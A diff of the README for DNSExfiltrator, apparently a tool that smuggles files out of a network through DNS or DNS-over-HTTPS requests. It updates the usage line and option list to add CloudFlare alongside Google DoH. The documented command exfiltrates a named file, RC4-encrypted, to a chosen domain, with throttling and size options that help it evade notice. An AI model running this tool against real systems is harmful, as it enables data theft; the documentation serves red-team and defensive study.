@@ -19,7 +19,7 @@ Features
 
 By default, DNSExfiltrator uses the system's  defined DNS server, but you can also set a specific one to use (*useful for debugging purposes or for running the server side locally for instance*).
 
-Alternatively, using the `-h` flag, DNSExfiltrator can perform DoH (*DNS over HTTP*) using the Google DoH servers.
+Alternatively, using the `h` parameter, DNSExfiltrator can perform DoH (*DNS over HTTP*) using the Google or CloudFlare DoH servers.
 
 DNSExfiltrator supports **basic RC4 encryption** of the exfiltrated data, using the provided password to encrypt/decrypt the data.
 
@@ -54,11 +54,11 @@ You can **either** use the compiled version, **or** the PowerShell wrapper (*whi
 
 1/ Using the C# compiled Windows executable (*which you can find in the `release` directory*):
 ```
-dnsExfiltrator.exe <file> <domainName> <password> [-h] [s=DNS_server] [t=throttleTime] [r=requestMaxSize] [l=labelMaxSize]
+dnsExfiltrator.exe <file> <domainName> <password> [h=google|cloudflare] [s=<DNS_server>] [t=<throttleTime>] [r=<requestMaxSize>] [l=<labelMaxSize>]
       file:           [MANDATORY] The file name to the file to be exfiltrated.
       domainName:     [MANDATORY] The domain name to use for DNS requests.
       password:       [MANDATORY] Password used to encrypt the data to be exfiltrated.
-      -h:             [OPTIONNAL] Flag enabling DoH (DNS over HTTP) usage. Uses Google's DoH servers.
+      h:              [OPTIONNAL] Use Google or CloudFlare DoH (DNS over HTTP) servers.
       DNS_Server:     [OPTIONNAL] The DNS server name or IP to use for DNS requests. Defaults to the system one.
       throttleTime:   [OPTIONNAL] The time in milliseconds to wait between each DNS request.
       requestMaxSize: [OPTIONNAL] The maximum size in bytes for each DNS request. Defaults to 255 bytes..
